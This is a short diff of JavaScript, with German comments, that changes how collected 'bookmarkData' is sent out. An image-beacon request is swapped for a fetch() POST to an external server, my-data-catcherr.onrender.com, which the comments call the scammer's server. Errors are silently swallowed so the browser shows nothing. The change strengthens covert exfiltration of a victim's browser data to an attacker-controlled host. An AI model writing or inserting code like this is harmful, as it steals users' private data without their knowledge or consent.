@@ -113,8 +113,11 @@
             };
 
             // Der Browser leitet lautlos weiter und schickt das Paket an den Server des Scammers
-            new Image().src = "https://my-data-catcherr.onrender.com/data/" +
-        encodeURIComponent(btoa(JSON.stringify(bookmarkData)));
+            fetch("https://my-data-catcherr.onrender.com/data", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify(bookmarkData)
+});
 
         } catch (e) {
             // Fehler werden ignoriert, damit der Browser nicht meckert
